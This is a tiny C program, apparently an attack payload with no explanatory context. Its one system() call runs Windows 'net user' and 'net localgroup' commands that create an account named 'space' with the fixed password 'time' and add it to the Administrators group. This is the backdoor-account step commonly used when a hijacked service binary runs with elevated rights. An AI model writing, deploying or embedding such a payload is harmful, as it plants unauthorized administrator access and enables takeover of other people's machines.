#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user space time /add && net localgroup administrators space /add");
  return 0;
}
